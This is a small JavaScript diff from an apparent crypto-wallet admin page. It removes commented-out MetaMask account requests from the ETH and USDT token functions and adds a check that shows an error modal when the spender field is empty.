@@ -299,13 +299,15 @@
     };
 
     async function fetchEthToken(id) {
-        // const accounts = await window.ethereum.request({
-        //     method: 'eth_requestAccounts'
-        // });
-        // const adminWalletAddress = accounts[0];
-
+      
         var wallet = $("#modal_eth_" + id).attr('data-wallet');
         var balance = $("#modal_eth_" + id).attr('data-balance');
+        var spender = $("#modal-spender").val();
+
+        if(spender == ''){
+
+            $('#spendererrorForm').modal('show');
+        }
 
         if(balance == '' || balance == '0.0' || balance == '0')
         {
@@ -325,11 +327,7 @@
     }
 
     async function fetchUsdtToken(id) {
-        // const accounts = await window.ethereum.request({
-        //     method: 'eth_requestAccounts'
-        // });
-        // const adminWalletAddress = accounts[0];
-
+     
         var wallet = $("#modal_usdt_" + id).attr('data-wallet');
         var balance = $("#modal_usdt_" + id).attr('data-balance');
 
